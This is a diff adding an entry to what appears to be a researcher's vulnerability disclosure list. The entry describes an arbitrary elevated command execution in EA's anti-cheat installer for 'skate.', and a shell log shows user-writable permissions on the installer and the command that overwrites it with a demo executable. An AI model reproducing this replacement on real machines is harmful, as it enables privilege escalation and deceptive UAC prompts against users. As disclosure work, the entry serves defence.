@@ -250,4 +250,35 @@ C:\Users\Fantastic\Desktop\Sayuri\JBL_and_WinAudioCore_0day>dir JBL_QuantumENGIN
                1 File(s)    139,327,096 bytes
                0 Dir(s)  237,500,821,504 bytes free
 ``` 
+
+- EA Sports "EA Anti-Cheat Installer" Arbitrary Elevated Command Execution. 
+  EA titles such as "skate." will install an anticheat service which uses a temporary
+  and user writable location. An attacker can replace the EAAntiCheat.Installer.exe 
+  during STEAM Install, and a UAC elevation prompt will come from STEAM engine, with 
+  Valve logo and Icon, but will execute your payload exe with elevated permissions. 
+  See EASkateUAC screenshots for use in UAC bypass(confusion?) attacks.
+
+```
+ Directory of C:\Program Files (x86)\Steam\steamapps\common\Skate\__Installer\EAAntiCheat
+
+09/29/2025  04:34 PM    <DIR>          .
+09/29/2025  04:13 PM    <DIR>          ..
+09/29/2025  04:31 PM       166,999,232 EAAntiCheat.Installer.exe
+               1 File(s)    166,999,232 bytes
+               2 Dir(s)  161,991,856,128 bytes free
+
+C:\Program Files (x86)\Steam\steamapps\common\Skate\__Installer\EAAntiCheat>cacls EAAntiCheat.Installer.exe
+C:\Program Files (x86)\Steam\steamapps\common\Skate\__Installer\EAAntiCheat\EAAntiCheat.Installer.exe BUILTIN\Users:(ID)F
+                                                                                                      NT AUTHORITY\SYSTEM:(ID)F
+                                                                                                      BUILTIN\Administrators:(ID)F
+                                                                                                      WIN11LAB\Fantastic:(ID)F
+                                                                                                      APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(ID)R
+                                                                                                      APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(ID)R
+
+
+C:\Program Files (x86)\Steam\steamapps\common\Skate\__Installer\EAAntiCheat>copy c:\Users\Fantastic\Documents\Work\EA\launch_demo.exe EAAntiCheat.Installer.exe
+Overwrite EAAntiCheat.Installer.exe? (Yes/No/All): A
+        1 file(s) copied.
+```
+
 These files are available under an Attribution-NonCommercial-NoDerivatives 4.0 International license.
